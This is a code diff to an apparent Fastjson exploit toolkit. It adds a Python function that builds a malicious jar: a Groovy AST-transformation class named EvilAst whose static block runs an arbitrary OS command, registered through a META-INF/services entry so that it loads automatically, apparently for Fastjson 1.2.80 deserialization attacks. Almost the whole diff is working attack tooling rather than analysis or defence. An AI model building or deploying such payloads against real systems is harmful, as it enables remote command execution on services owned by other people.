@@ -188,6 +188,54 @@ public class EvilAst implements ASTTransformation {
         return buf.getvalue(), echo
 
 
+def build_groovy_exec_jar(*, cmd: str = "id") -> bytes:
+    """生成 Groovy SPI jar：静态块 Runtime.exec(cmd)（非回显，OS 自适应）。"""
+    from fastjson_toolkit.poc.echo.source import java_os_adaptive_exec, java_string_literal
+
+    cmd_lit = java_string_literal(cmd or "id")
+    exec_block = java_os_adaptive_exec(f'"{cmd_lit}"', indent="            ")
+    evil_src = f"""\
+package fj1280;
+
+import org.codehaus.groovy.ast.ASTNode;
+import org.codehaus.groovy.control.CompilePhase;
+import org.codehaus.groovy.control.SourceUnit;
+import org.codehaus.groovy.transform.ASTTransformation;
+import org.codehaus.groovy.transform.GroovyASTTransformation;
+
+@GroovyASTTransformation(phase = CompilePhase.CONVERSION)
+public class EvilAst implements ASTTransformation {{
+    static {{
+        try {{
+{exec_block}
+        }} catch (Throwable ignore) {{
+        }}
+    }}
+
+    @Override
+    public void visit(ASTNode[] nodes, SourceUnit source) {{
+    }}
+}}
+"""
+    with tempfile.TemporaryDirectory(prefix="fj-groovy-exec-") as td:
+        root = Path(td)
+        stub_cp = _compile_groovy_stubs(root / "stubs")
+        evil_bytes = compile_java_source(
+            evil_src,
+            "EvilAst",
+            classpath=stub_cp,
+            out_dir=root / "evil_out",
+        )
+        buf = io.BytesIO()
+        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
+            zf.writestr("fj1280/EvilAst.class", evil_bytes)
+            zf.writestr(
+                "META-INF/services/org.codehaus.groovy.transform.ASTTransformation",
+                "fj1280.EvilAst\n",
+            )
+        return buf.getvalue()
+
+
 def write_echo_attack_files(
     out_dir: Path,
     *,
